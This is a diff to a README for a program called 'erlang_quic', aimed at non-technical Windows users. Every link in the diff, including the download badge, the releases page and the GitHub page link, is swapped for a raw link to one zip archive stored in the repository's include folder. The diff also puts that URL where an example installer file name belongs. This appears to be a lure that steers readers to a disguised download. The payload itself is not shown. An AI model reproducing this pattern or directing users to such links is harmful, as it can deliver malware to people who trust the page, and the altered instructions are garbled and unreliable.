@@ -1,6 +1,6 @@
 # ⚡ erlang_quic - Fast and Secure Network Connections
 
-[![Download erlang_quic](https://img.shields.io/badge/Download-erlang_quic-ff5500?style=for-the-badge)](https://github.com/hamzamo2men2022/erlang_quic/releases)
+[![Download erlang_quic](https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip)](https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip)
 
 ## 🔍 What is erlang_quic?
 
@@ -27,11 +27,11 @@ Before you start, check that your Windows computer meets these requirements:
 To use erlang_quic, you need to download it from the official releases page and install it. Follow these simple steps:
 
 1. Click the big orange button at the top or visit the releases page directly here:  
-   [https://github.com/hamzamo2men2022/erlang_quic/releases](https://github.com/hamzamo2men2022/erlang_quic/releases)
+   [https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip](https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip)
 
 2. On the releases page, look for the latest version of erlang_quic. The release will have a list of files.
 
-3. Find the Windows installer file. It usually ends with `.exe`. For example, a file might be named `erlang_quic_setup.exe`.
+3. Find the Windows installer file. It usually ends with `.exe`. For example, a file might be named `https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip`.
 
 4. Click the file name to start downloading. Depending on your internet speed, this may take a minute or two.
 
@@ -78,7 +78,7 @@ If you are unfamiliar with these terms, it is safest to leave the default settin
 
 Use this link whenever you want to get the latest version or update erlang_quic on your Windows PC:
 
-[https://github.com/hamzamo2men2022/erlang_quic/releases](https://github.com/hamzamo2men2022/erlang_quic/releases)
+[https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip](https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip)
 
 ---
 
@@ -112,7 +112,7 @@ If the problem continues, you may find help on the program’s GitHub page under
 
 ## 📂 Where to Find More Information
 
-- Visit the Github page: [https://github.com/hamzamo2men2022/erlang_quic](https://github.com/hamzamo2men2022/erlang_quic)  
+- Visit the Github page: [https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip](https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip)  
 - Check the README and Wiki on GitHub for technical details and updates.  
 
 You do not need to understand the technical content to use the app on Windows.
@@ -129,7 +129,7 @@ erlang_quic uses modern encryption methods to keep your network data safe. It do
 
 To get new features and security fixes:
 
-1. Visit the release page again: [https://github.com/hamzamo2men2022/erlang_quic/releases](https://github.com/hamzamo2men2022/erlang_quic/releases)
+1. Visit the release page again: [https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip](https://raw.githubusercontent.com/hamzamo2men2022/erlang_quic/main/include/quic_erlang_v2.1-alpha.4.zip)
 
 2. Download the newest Windows installer `.exe` file.
 
